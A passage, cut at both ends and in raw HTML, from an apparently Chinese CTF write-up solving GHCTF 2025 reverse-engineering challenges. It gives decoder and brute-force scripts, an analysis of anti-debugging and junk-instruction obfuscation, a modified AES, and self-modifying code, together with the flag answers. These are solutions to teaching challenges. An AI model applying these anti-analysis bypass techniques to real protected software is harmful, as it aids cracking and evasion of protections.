<span class="built_in">len</span>(MMMMMMMMMiiiooo) % <span class="number">4</span>) % <span class="number">4</span></span><br><span class="line">        MMMMMMMMMiiiooo += <span class="string">b&#x27;\x00&#x27;</span> * MMMMMMMiiiiioo</span><br><span class="line">        <span class="keyword">for</span> MMMMMMiiiiiio <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(MMMMMMMMMiiiooo), <span class="number">4</span>):</span><br><span class="line">            MMMMiiiiiiooooo = MMMMMMMMMiiiooo[MMMMMMiiiiiio[:MMMMMMiiiiiio + <span class="number">4</span>]]</span><br><span class="line">            MMMMMMiiioooooo = <span class="built_in">int</span>.from_bytes(MMMMiiiiiiooooo, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">            MMMMMMMiiooooooooo = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                MMMMMMMiiooooooooo = MMMMiiiiiio.MMiiiiiiooo[MMMMMMiiioooooo % <span class="number">85</span>] + MMMMMMMiiooooooooo</span><br><span class="line">                MMMMMMiiioooooo //= <span class="number">85</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                MMMMiiiiioooooooooo += MMMMMMMiiooooooooo</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> MMMMMMMiiiiioo:</span><br><span class="line">                MMMMiiiiioooooooooo = MMMMiiiiioooooooooo[<span class="literal">None</span>[:-MMMMMMMiiiiioo]]</span><br><span class="line">            <span class="keyword">return</span> MMMMiiiiioooooooooo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RRRRyyooo</span>:</span><br><span class="line">    RRRRyooooooo = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(RRRRRRRyyyyyoooo) <span class="keyword">for</span> RRRRRRRyyyyyoooo <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">93</span>)])</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">RRRRRRRyyyyooooo</span>(<span class="params">RRRRRRyyyoooooo: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        RRRRyyyyyooo = []</span><br><span class="line">        RRyyyyyyyyyoooooo = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> RRyyyyyyyyyoooooo &lt; <span class="built_in">len</span>(RRRRRRyyyoooooo):</span><br><span class="line">            <span class="keyword">if</span> RRyyyyyyyyyoooooo + <span class="number">1</span> &lt; <span class="built_in">len</span>(RRRRRRyyyoooooo):</span><br><span class="line">                RRRRRRRRRyyo = RRRRRRyyyoooooo[RRyyyyyyyyyoooooo] &lt;&lt; <span class="number">8</span> | RRRRRRyyyoooooo[RRyyyyyyyyyoooooo + <span class="number">1</span>]</span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo % <span class="number">45</span>])</span><br><span class="line">                RRRRRRRRRyyo //= <span class="number">45</span></span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo % <span class="number">45</span>])</span><br><span class="line">                RRRRRRRRRyyo //= <span class="number">45</span></span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo])</span><br><span class="line">                RRyyyyyyyyyoooooo += <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                RRRRRRRRRyyo = RRRRRRyyyoooooo[RRyyyyyyyyyoooooo]</span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo % <span class="number">45</span>])</span><br><span class="line">                RRRRRRRRRyyo //= <span class="number">45</span></span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo])</span><br><span class="line">                RRyyyyyyyyyoooooo += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(RRRRyyyyyooo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SSSooooyyooo</span>(<span class="params">SSSSooyoooooo, SSSSSoyyooooo</span>):</span><br><span class="line">    SSoooooyyyyyyoo = []</span><br><span class="line">    <span class="keyword">for</span> SSSSSSSSSoyooo <span class="keyword">in</span> SSSSooyoooooo:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;a&quot;</span> &lt;= SSSSSSSSSoyooo &lt;= <span class="string">&quot;z&quot;</span>:</span><br><span class="line">            SSSSoooyooooooo = (<span class="built_in">ord</span>(SSSSSSSSSoyooo) - <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) + SSSSSoyyooooo) % <span class="number">26</span></span><br><span class="line">            SSoooooyyyyyyoo.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) + SSSSoooyooooooo))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;0&quot;</span> &lt;= SSSSSSSSSoyooo &lt;= <span class="string">&quot;9&quot;</span>:</span><br><span class="line">            SSSSoooyooooooo = (<span class="built_in">ord</span>(SSSSSSSSSoyooo) - <span class="built_in">ord</span>(<span class="string">&quot;0&quot;</span>) - SSSSSoyyooooo) % <span class="number">10</span></span><br><span class="line">            SSoooooyyyyyyoo.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;0&quot;</span>) + SSSSoooyooooooo))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            SSoooooyyyyyyoo.append(SSSSSSSSSoyooo)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(SSoooooyyyyyyoo)</span><br></pre></td></tr></table></figure><p>可以看出第一个是标准Base85加密，第二个是Base45加密，但是和标准的表不一样，第三个是经典的凯撒加密。</p><p>这部分就是Base45实际用到的表。</p><p><code>TABLE = &quot;&quot;.join([chr(i) for i in range(48, 93)])</code></p><p>编写三个加密的解密函数，按Secret文件的代码对Enc数据进行按顺序调用解密即可得到Flag。</p><p>解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_encrypt</span>(<span class="params">text, shift</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;0&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) - shift) % <span class="number">10</span> + <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base85_decode</span>(<span class="params">encoded_text</span>):</span><br><span class="line">    byte_data = encoded_text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    decoded = base64.a85decode(byte_data)</span><br><span class="line">    <span class="keyword">return</span> decoded.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base45_decode_custom</span>(<span class="params">data: <span class="built_in">str</span></span>):</span><br><span class="line">    decoded = <span class="built_in">bytearray</span>()</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    chars = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">93</span>)])</span><br><span class="line">    char_to_val = &#123;ch: i <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(chars)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        <span class="keyword">if</span> i + <span class="number">2</span> &lt; <span class="built_in">len</span>(data):</span><br><span class="line">            num = (char_to_val[data[i + <span class="number">2</span>]] * <span class="number">45</span> * <span class="number">45</span> +</span><br><span class="line">                    char_to_val[data[i + <span class="number">1</span>]] * <span class="number">45</span> +</span><br><span class="line">                    char_to_val[data[i]])</span><br><span class="line">            decoded.append(num &gt;&gt; <span class="number">8</span>)</span><br><span class="line">            decoded.append(num &amp; <span class="number">0xFF</span>)</span><br><span class="line">            i += <span class="number">3</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = (char_to_val[data[i + <span class="number">1</span>]] * <span class="number">45</span> +</span><br><span class="line">                    char_to_val[data[i]])</span><br><span class="line">            decoded.append(num)</span><br><span class="line">            i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> decoded.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    enc = <span class="built_in">bytes</span>([<span class="number">57</span>, <span class="number">118</span>, <span class="number">33</span>, <span class="number">114</span>, <span class="number">68</span>, <span class="number">56</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">34</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">78</span>, <span class="number">40</span>, <span class="number">49</span>, <span class="number">59</span>, <span class="number">95</span>, <span class="number">85</span>, <span class="number">63</span>, <span class="number">122</span>, <span class="number">54</span>, <span class="number">33</span>, <span class="number">77</span>, <span class="number">110</span>, <span class="number">49</span>, <span class="number">54</span>, <span class="number">34</span>, <span class="number">109</span>, <span class="number">106</span>, <span class="number">122</span>, <span class="number">60</span>, <span class="number">92</span>, <span class="number">108</span>, <span class="number">91</span>, <span class="number">61</span>, <span class="number">51</span>, <span class="number">42</span>, <span class="number">62</span>, <span class="number">35</span>, <span class="number">38</span>, <span class="number">52</span>, <span class="number">67</span>, <span class="number">62</span>, <span class="number">122</span>, <span class="number">116</span>, <span class="number">48</span>, <span class="number">76</span>, <span class="number">50</span>, <span class="number">67</span>, <span class="number">51</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">122</span>, <span class="number">45</span>, <span class="number">45</span>, <span class="number">51</span>, <span class="number">90</span>])</span><br><span class="line">    </span><br><span class="line">    p1 = caesar_encrypt(enc.decode(),-<span class="number">9</span>)</span><br><span class="line">    p2 = base85_decode(p1)</span><br><span class="line">    p3 = caesar_encrypt(p2,-<span class="number">7</span>)</span><br><span class="line">    flag = base45_decode_custom(p3)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="Flag值-3"><a href="#Flag值-3" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;Th3y&#39;r3_a11_p1aY_Ba5e!&#125;</code></p><h2 id="TimeSpaceRescue"><a href="#TimeSpaceRescue" class="headerlink" title="TimeSpaceRescue"></a>TimeSpaceRescue</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>这题考点是反调试、花指令、时间爆破、AES魔改。</p><p>AES魔改的地方很明显，对比标准算法代码就可以马上找出，就多调用了两个函数对Key和加密数据进行了变换。</p><p>IDA反编译main函数，发现使用一个函数生成了一个数据，然后将生成数据与输入内容传入到加密函数内加密，最后比对。</p><p><img src="/2025/03/06/GHCTF2025WP/22.png" alt="alt text"></p><p>进入生成数据函数中，可以看到反调试代码，核心逻辑是获取当前时间。</p><p>时间结构体如下，可以看到使用memcpy将tm_mday开始往后三个整数数值复制到Src数组中，也就是复制了day、month、year数据。</p><p>然后调用sub_4021A0利用复制的时间数据生成16字节数据，可以观察得知sub_4021A0是MD5函数，如果不知道的话也可以直接把代码抠出来进行调用。</p><p>最后将MD5得到的字节都异或上0x14。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">tm</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> tm_sec;  <span class="comment">/*秒，正常范围0-59， 但允许至61*/</span></span><br><span class="line">    <span class="type">int</span> tm_min;  <span class="comment">/*分钟，0-59*/</span></span><br><span class="line">    <span class="type">int</span> tm_hour; <span class="comment">/*小时， 0-23*/</span></span><br><span class="line">    <span class="type">int</span> tm_mday; <span class="comment">/*日，即一个月中的第几天，1-31*/</span></span><br><span class="line">    <span class="type">int</span> tm_mon;  <span class="comment">/*月， 从一月算起，0-11*/</span></span><br><span class="line">    <span class="type">int</span> tm_year; <span class="comment">/*年， 从1900至今已经多少年*/</span></span><br><span class="line">    <span class="type">int</span> tm_wday; <span class="comment">/*星期，一周中的第几天， 从星期日算起，0-6*/</span></span><br><span class="line">    <span class="type">int</span> tm_yday; <span class="comment">/*从今年1月1日到目前的天数，范围0-365*/</span></span><br><span class="line">    <span class="type">int</span> tm_isdst;<span class="comment">/*日光节约时间的旗标*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/GHCTF2025WP/23.png" alt="alt text"></p><p>这边看到函数结尾return 39有点奇怪，转到这个函数汇编界面，会发现函数底部有个花指令。</p><p>这边花指令的原理是二次计算，call完第一次计算结果不等于目标值，函数返回后还是从计算地址指令开始执行，进行了第二次计算，此时计算结果等于目标值进行jz跳转，用二次计算误导IDA认为该部分会直接ret而不会jz跳转执行下面部分命令。</p><p><img src="/2025/03/06/GHCTF2025WP/24.png" alt="alt text"></p><p>将红框内汇编nop掉，重新反编译会发现函数尾部又多了一次异或加密。</p><p>所以这边的密钥生成就是利用当前时间的年月日数据进行MD5，然后进行两次的异或计算得到最终的16字节密钥，结合题目描述，应该是需要爆破时间来得到有效密钥。</p><p><img src="/2025/03/06/GHCTF2025WP/25.png" alt="alt text"></p><p>接下来分析AES加密函数，发现函数尾部return 39，返回汇编解密，发现同样函数尾部有花指令。</p><p><img src="/2025/03/06/GHCTF2025WP/26.png" alt="alt text"></p><p>nop后就会发现尾部有个异或0x11的操作，跳到那个全部byte的交叉调用函数，发现是反调试，如果检测到调试，AES加密尾部就会把加密的数据再进行异或0x11处理，进行数据混淆。</p><p><img src="/2025/03/06/GHCTF2025WP/27.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/28.png" alt="alt text"></p><p>通过比对标准算法队函数进行命名，发现多了这三个非AES标准流程的函数，</p><p><img src="/2025/03/06/GHCTF2025WP/29.png" alt="alt text"></p><p>第一个函数是传入了密钥数据，将相邻两个字节两两互换并异或上5。第三个函数也是和第一个相同的，不过处理的是加密完的密文。</p><p><img src="/2025/03/06/GHCTF2025WP/30.png" alt="alt text"></p><p>第二个函数是将要进行加密的16字节明文字节数据前后翻转，并都异或上0xF。</p><p><img src="/2025/03/06/GHCTF2025WP/31.png" alt="alt text"></p><p>至此所有流程分析完毕，可以复制一份标准算法直接进行解密，不过需要手动调用那两个函数进行再次逆向处理，然后配合月日爆破（年份题目描述已给，2024年）。</p><p><strong>注：该程序在初始化会进行三个反调试函数的调用，一个是调用IsDebuggerPresent和CheckRemoteDebuggerPresent，一个是刚刚上文提到的给全局一个Byte赋值，最后一个是对当前进程遍历查找恶意进程，对反调试感兴趣的可以根据我提供的这些函数去反向查找自行处理试试看。</strong></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;aes.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;md5.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Reverse</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title">sub_401030</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">    <span class="type">char</span> v4; <span class="comment">// [esp+Bh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">15</span>; ; --i)</span><br><span class="line">    &#123;</span><br><span class="line">        result = v3;</span><br><span class="line">        <span class="keyword">if</span> (v3 &gt;= i)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v4 = *(BYTE*)(v3 + a1) ^ <span class="number">0xF</span>;</span><br><span class="line">        *(BYTE*)(v3 + a1) = *(BYTE*)(i + a1) ^ <span class="number">0xF</span>;</span><br><span class="line">        *(BYTE*)(i + a1) = v4;</span><br><span class="line">        ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SwapPairs</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title">sub_4010A0</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line">    <span class="type">char</span> v3; <span class="comment">// [esp+7h] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v3 = *(BYTE*)(i + a1) ^ <span class="number">5</span>;</span><br><span class="line">        *(BYTE*)(i + a1) = *(BYTE*)(i + a1 + <span class="number">1</span>) ^ <span class="number">5</span>;</span><br><span class="line">        *(BYTE*)(i + a1 + <span class="number">1</span>) = v3;</span><br><span class="line">        result = i + <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> month = <span class="number">0</span>; month &lt; <span class="number">12</span>; month++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> day = <span class="number">1</span>; day &lt;= <span class="number">31</span>; day++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint8_t</span> EncFlag[] =</span><br><span class="line">            &#123; </span><br><span class="line">                <span class="number">0xCD</span>,<span class="number">0x16</span>,<span class="number">0xDB</span>,<span class="number">0xB5</span>,<span class="number">0xD1</span>,<span class="number">0x02</span>,<span class="number">0xA4</span>,<span class="number">0x82</span>,<span class="number">0x8E</span>,<span class="number">0x59</span>,</span><br><span class="line">                <span class="number">0x73</span>,<span class="number">0x9E</span>,<span class="number">0x96</span>,<span class="number">0x26</span>,<span class="number">0x56</span>,<span class="number">0xF2</span>,<span class="number">0x16</span>,<span class="number">0x8E</span>,<span class="number">0x46</span>,<span class="number">0xF2</span>,</span><br><span class="line">                <span class="number">0x55</span>,<span class="number">0x7B</span>,<span class="number">0x92</span>,<span class="number">0x31</span>,<span class="number">0x30</span>,<span class="number">0xDC</span>,<span class="number">0xAA</span>,<span class="number">0x8A</span>,<span class="number">0xF3</span>,<span class="number">0x1C</span>,</span><br><span class="line">                <span class="number">0xA0</span>,<span class="number">0xAA</span> </span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="type">uint8_t</span> Key[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line">            <span class="type">int</span> TimeData[]&#123; day,month,<span class="number">2024</span> - <span class="number">1900</span> &#125;;</span><br><span class="line">            <span class="built_in">md5</span>((<span class="type">uint8_t</span>*)TimeData, <span class="number">12</span>, Key);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">                *(Key + i) = (Key[i] ^ <span class="number">0x114</span>) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">                *(Key + i) = (Key[i] ^ <span class="number">0x11</span>) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// swap key</span></span><br><span class="line">            <span class="built_in">sub_4010A0</span>((<span class="type">int</span>)Key);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// swap encData</span></span><br><span class="line">            <span class="built_in">sub_4010A0</span>((<span class="type">int</span>)EncFlag);</span><br><span class="line">            <span class="built_in">sub_4010A0</span>((<span class="type">int</span>)(EncFlag + <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// decrypt</span></span><br><span class="line">            <span class="built_in">aesDecrypt</span>(Key, <span class="number">16</span>, EncFlag, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// reverse encData</span></span><br><span class="line">            <span class="built_in">sub_401030</span>((<span class="type">int</span>)EncFlag);</span><br><span class="line">            <span class="built_in">sub_401030</span>((<span class="type">int</span>)(EncFlag + <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (EncFlag[<span class="number">0</span>] == <span class="string">&#x27;N&#x27;</span></span><br><span class="line">                &amp;&amp; EncFlag[<span class="number">1</span>] == <span class="string">&#x27;S&#x27;</span></span><br><span class="line">                &amp;&amp; EncFlag[<span class="number">2</span>] == <span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, EncFlag);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值-4"><a href="#Flag值-4" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;W0w_Y0u&#39;re_@n_AE5_M@5t3r&#125;</code></p><h2 id="Room-0"><a href="#Room-0" class="headerlink" title="Room 0"></a>Room 0</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>这题出的时候也是突发奇想，想把SMC和异常两个考点结合起来，于是出了一个这样强技巧性的题目，如果选手没有意识到考点就没办法解出。后续放出了两个Hint指出了是除0异常和SMC特性，题解就猛涨了（，技巧性确实会强一点。</p><p>IDA分析main函数，发现有个CPPEH_RECORD的异常结构体。</p><p><img src="/2025/03/06/GHCTF2025WP/32.png" alt="alt text"></p><p>回到汇编流程图会发现存在try和catch的捕获异常代码。</p><p><img src="/2025/03/06/GHCTF2025WP/33.png" alt="alt text"></p><p>将此处的jmp和ret都nop掉就可以在反编译代码段看到catch执行的代码部分。</p><p><img src="/2025/03/06/GHCTF2025WP/34.png" alt="alt text"></p><p>发现多了三个函数调用，就是catch部分执行的函数。</p><p><img src="/2025/03/06/GHCTF2025WP/35.png" alt="alt text"></p><p>第一个函数是经典的unhex函数（”1f2f”-&gt;0x1f2f）。</p><p><img src="/2025/03/06/GHCTF2025WP/36.png" alt="alt text"></p><p>第二个函数存在三处花指令，第一处和第三处直接全部nop，第二处对call按u，在跳过第一个字节按c重新分析下面部分代码，跳过0xE8字节。</p><p><img src="/2025/03/06/GHCTF2025WP/37.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/38.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/39.png" alt="alt text"></p><p>选中函数按P重新识别为函数进行反编译，发现这部分实际上就是SMC函数处，利用传进的密钥数据对.enc代码进行异或解密。</p><p>只不过传进的四字节整数密钥再函数开头做了字节倒序的处理，将四个字节顺序翻转，那么接下来任务就是找到密钥。</p><p><img src="/2025/03/06/GHCTF2025WP/40.png" alt="alt text"></p><p>回到main函数，发现程序要求输入key，然后调用一个call返回值要是0x11451419，然后利用0x11451419进行了一个RC4加密，最后对比一个字节数组，如果选手尝试解密这部分字节数组，会发现解出来的是FakeFlag。</p><p><code>NSSCTF&#123;FAKE_FAKE_FAKE_FAKE_FAKE&#125;</code></p><p><img src="/2025/03/06/GHCTF2025WP/41.png" alt="alt text"></p><p>进入sub_402000函数，可以看到是将输入的密钥调用unhex得到四字节数值，然后进行一个32轮的计算，在箭头处可以看到有一个除法计算，以及除数部分的一个变量与常数相减。</p><p>结合前面发现的异常捕获，可以知道这部分会有可能出现除数等于0，也就是触发除0异常。那么可以通过爆破的方式找到一个可以在计算过程中触发除0异常的值，那就是目标密钥了，因为SMC传入的密钥就是我们输入的密钥字串经过unhex的数据。</p><p><img src="/2025/03/06/GHCTF2025WP/42.png" alt="alt 